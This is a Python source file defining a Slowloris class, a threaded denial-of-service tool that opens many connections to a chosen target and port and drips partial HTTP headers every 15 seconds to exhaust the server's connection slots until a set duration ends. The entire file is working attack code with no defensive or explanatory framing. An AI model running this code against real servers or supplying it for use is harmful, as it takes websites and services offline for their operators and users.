import socket
import threading
import time

class Slowloris:
    def __init__(self, target, port, threads, duration):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.is_running = False
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept-language: en-US,en,q=0.5"
        ]

    def attack(self):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode())
                for header in self.headers:
                    s.send(f"{header}\r\n".encode())
                    time.sleep(15)  # Mantener conexión abierta
            except:
                pass

    def start(self):
        self.is_running = True
        for _ in range(self.threads):
            threading.Thread(target=self.attack).start()
        threading.Thread(target=self.stop_after_duration).start()

    def stop_after_duration(self):
        time.sleep(self.duration)
        self.stop()

    def stop(self):
        self.is_running = False